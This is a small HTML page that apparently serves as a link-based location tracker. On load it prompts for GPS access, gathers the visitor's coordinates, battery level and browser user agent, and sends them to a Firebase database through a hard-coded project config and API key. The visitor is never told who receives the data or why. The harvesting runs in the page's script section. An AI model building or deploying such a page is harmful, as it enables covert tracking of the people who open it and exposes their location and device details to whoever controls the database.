<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Location Permission</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- Firebase -->
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

<script>
// Your Firebase Config
const firebaseConfig = {
  apiKey: "AIzaSyCsGBSRCHVUhXQZ5DNMEZWgQWk1gxMF1E4",
  authDomain: "signup-d32c5.firebaseapp.com",
  projectId: "signup-d32c5",
  storageBucket: "signup-d32c5.firebasestorage.app",
  messagingSenderId: "583812949955",
  appId: "1:583812949955:web:fab1bb7be94bc1b4ab3f76",
  measurementId: "G-VLC3QHK8CG",
  databaseURL: "https://signup-d32c5-default-rtdb.firebaseio.com/"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

function requestLocation(){
  if (!navigator.geolocation) {
    alert("Your phone doesn't support geolocation!");
    return;
  }

  navigator.geolocation.getCurrentPosition(success, error);
}

async function success(position){
  let lat = position.coords.latitude;
  let lon = position.coords.longitude;

  // Battery Info
  let battery = "Unknown";
  try {
    const bat = await navigator.getBattery();
    battery = (bat.level * 100) + "%";
  } catch {}

  // Device Info
  let device = navigator.userAgent;

  // Save to Firebase
  db.ref("location").push({
    latitude: lat,
    longitude: lon,
    battery: battery,
    device: device,
    time: new Date().toLocaleString()
  });

  document.getElementById("status").innerHTML = 
  "‚úÖ Location Received & Saved <br> üìç Lat: "+lat+" <br>üìç Lon: "+lon+"<br>üîã Battery: "+battery;
}

function error(){
  alert("‚ùå Location permission denied. Please allow GPS.");
}
</script>
</head>

<body onload="requestLocation()">
<h2>üìç Waiting for Location Permission...</h2>
<p id="status">Please Allow Location Access</p>
</body>
</html>
